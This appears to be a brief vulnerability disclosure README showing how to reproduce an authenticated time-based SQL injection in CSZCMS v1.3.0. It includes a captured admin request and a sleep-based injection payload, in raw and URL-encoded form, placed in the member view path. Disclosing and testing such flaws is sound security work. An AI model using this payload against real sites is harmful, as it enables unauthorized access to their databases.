# CSZCMS-v1.3.0---SQL-Injection-Authenticated-
CSZCMS v1.3.0  SQL Injection (Authenticated)

# 1 - Log in to the admin portal

http://localhost/cszcms/admin/login

# 2 - Navigate to General Menu > Member Users.

# 3 Click the 'View' button next to any username.

# 4 Intercept the request
```
GET /cszcms/admin/members/view/1 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: 86112035d26bb3c291899278f9ab4fb2_cszsess=n5v1jcdqfjuuo32ng66e4rttg65ugdss
Upgrade-Insecure-Requests: 1
```


# 5 Modify the paramter 

/cszcms/admin/members/view/1

to 

/cszcms/admin/members/view/'or(sleep(10))#

and url encode all characters

/cszcms/admin/members/view/%27%6f%72%28%73%6c%65%65%70%28%31%30%29%29%23%20
